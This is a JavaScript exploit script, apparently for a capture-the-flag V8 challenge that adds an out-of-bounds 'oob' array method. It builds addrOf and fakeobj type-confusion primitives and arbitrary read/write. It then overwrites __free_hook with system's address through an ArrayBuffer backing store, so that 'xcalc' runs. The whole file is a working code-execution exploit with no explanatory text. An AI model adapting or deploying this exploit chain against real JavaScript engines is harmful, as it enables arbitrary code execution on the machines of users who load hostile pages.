var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var tmp_obj = {"A":1};
var obj_arr = [tmp_obj];
var fl_arr = [1.1,1.2,1.3,1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

var read_arr = [map2, 1.2, 1.3, 1.4];
var fake_obj = fakeobj(addrOf(read_arr)-0x20n);

function ftoi(val) {
    f64_buf[0] = val;
    
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);

    return f64_buf[0];
}

function addrOf(obj) {
    obj_arr[0] = obj;

    obj_arr.oob(map2);

    let addr = obj_arr[0];

    obj_arr.oob(map1);

    return ftoi(addr);
}

function fakeobj(addr) {
    fl_arr[0] = itof(addr);

    fl_arr.oob(map1);

    let fake = fl_arr[0];

    fl_arr.oob(map2);

    return fake;
}

function arbRead(addr) {
    //var fake_obj = fakeobj(addrOf(read_arr) - 0x20n);

    read_arr[2] = itof(BigInt(addr) - 0x10n);

    console.log("0x"+ftoi(fake_obj[0]).toString(16));
    return ftoi(fake_obj[0]);
}

function arbWrite(addr, val) {
    //var fake_obj = fakeobj(addrOf(read_arr)-0x20n);
    read_arr[2] = itof(BigInt(addr)-0x10n);

    fake_obj[0] = itof(BigInt(val));
}

var test = [1,2,3,4];
var test2 = [1,2,3,4];

var freehook = BigInt(0x7ffff7dfde48);
var system = BigInt(0x7ffff7c61290);

var buf = new ArrayBuffer(8);
var bstore = addrOf(buf)+0x20n;
var dv = new DataView(buf);

arbWrite(bstore, freehook);
dv.setBigUint64(0, system, true);

console.log("xcalc");

//arbWrite(addrOf(test), addrOf(test2));

